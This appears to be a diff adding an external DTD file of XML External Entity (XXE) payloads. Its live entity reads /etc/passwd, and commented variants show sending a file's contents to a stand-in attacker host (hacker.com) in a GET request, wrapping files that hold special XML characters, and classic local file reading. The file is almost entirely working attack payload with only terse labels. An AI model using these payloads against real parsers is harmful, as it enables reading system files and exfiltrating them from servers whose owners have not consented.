@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!ENTITY % one '<!ENTITY trick SYSTEM "file:///etc/passwd">'>
+%one;
+<!--  Sending the contents of a file in your local system to an attacker via get request
+<!ENTITY % one '<!ENTITY trick SYSTEM "http://hacker.com/?read=%file;">'>
+%one;
+-->
+
+<!--  Get the contents of a file, that contains special (from XML point of view) chars
+<!ENTITY % one '<!ENTITY trick "%start; %file; %end;">'>
+%one;
+-->
+
+<!--  Classical reading of a local file
+<!ENTITY % one '<!ENTITY trick SYSTEM "file:///etc/passwd">'>
+%one;
+-->
